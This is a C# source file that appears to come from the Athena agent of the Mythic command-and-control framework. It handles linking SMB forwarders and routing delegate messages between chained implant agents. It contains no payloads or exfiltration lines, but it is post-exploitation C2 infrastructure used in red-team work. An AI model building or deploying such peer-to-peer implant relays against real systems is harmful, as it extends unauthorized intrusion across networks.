using Athena.Forwarders;
using Athena.Models.Config;
using Athena.Models.Mythic.Response;
using Athena.Models.Mythic.Tasks;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.Text.Json;

namespace Athena.Handler.Common
{
    public class ForwarderHandler
    {
        ConcurrentDictionary<string, SMBForwarder> forwarders = new ConcurrentDictionary<string, SMBForwarder>();
        ConcurrentDictionary<string, SMBForwarder> tempForwarders = new ConcurrentDictionary<string, SMBForwarder>(); //Used to store before we know the "true" UUID of the fwd
        ConcurrentDictionary<string, ConcurrentQueue<DelegateMessage>> messageQueue = new ConcurrentDictionary<string, ConcurrentQueue<DelegateMessage>>();
        //SMBForwarder fwrdr = new SMBForwarder();

        public ForwarderHandler()
        {

        }

        public async Task<bool> LinkForwarder(MythicJob job, string uuid)
        {
            Debug.WriteLine($"[{DateTime.Now}] Initiating forwarder link");

            //return await fwrdr.Link(job, uuid);

            //Dictionary<string, string> par = JsonSerializer.Deserialize<Dictionary<string, string>>(job.task.parameters);

            //switch (par["type"].ToLower())
            switch ("smb".ToLower())
            {
                case "smb":
                    //Generate temporary UUID so we're at least tracking something
                    string id = Guid.NewGuid().ToString();
                    Console.WriteLine("Our Guid: " + id);
                    //Add to our tracker
                    if (!this.tempForwarders.TryAdd(id, new SMBForwarder(id)))
                    {
                        return false;
                    }
                    Debug.WriteLine($"[{DateTime.Now}] Added forwarder to temp tracker.");

                    //Attempt to link to the forwarder
                    if (!await this.tempForwarders[id].Link(job, uuid))
                    {
                        Debug.WriteLine($"[{DateTime.Now}] Removing from our tracker.");
                        this.tempForwarders.Remove(id, out _); //Delete it from our list if the link failed.
                        return false;
                    }
                    break;
                default:
                    break;
            }

            return true;
        }

        public async Task HandleDelegateMessages(List<DelegateMessage> messages)
        { 

            foreach(var msg in messages)
            {
                if (string.IsNullOrEmpty(msg.uuid))
                {
                    bool success = this.messageQueue.TryAdd(msg.new_uuid, new ConcurrentQueue<DelegateMessage>());
                    msg.uuid = msg.new_uuid;
                }
                Debug.WriteLine($"[{DateTime.Now}] Adding message for agent: {msg.new_uuid}");
                this.messageQueue[msg.uuid].Enqueue(msg);
            }

            Parallel.ForEach(messageQueue, async queue =>
            {
                while (!queue.Value.IsEmpty)
                {
                    DelegateMessage dm;
                    if(!queue.Value.TryDequeue(out dm))
                    {
                        continue;
                    }
                    await HandleDelegate(dm);
                }                        
            });
        }

        private async Task<bool> HandleDelegate(DelegateMessage dm)
        {
            Console.WriteLine("Handling Delegate.");
            if (!forwarders.ContainsKey(dm.uuid)) //Check to see if it's a first message or not
            {
                Console.WriteLine("Adding forwarder key");
                SMBForwarder fwd;
                if (this.tempForwarders.TryRemove(this.tempForwarders.First().Key, out fwd)) //Remove (hopefully) the only temporary forwarder we're looking for
                {

                    if(fwd is null)
                    {
                        Console.WriteLine("Fwd is null");
                    }
                    Console.WriteLine(this.forwarders.TryAdd(dm.uuid, fwd)); //Add to our permanent tracker
                    this.forwarders[dm.uuid].id = dm.uuid;
                }
            }
            Console.WriteLine("Forwarding Delegate.");
            //Should I wait after this or should I just let it go? Delay between them?
            return await this.forwarders[dm.uuid].ForwardDelegateMessage(dm);
        }
    }
}
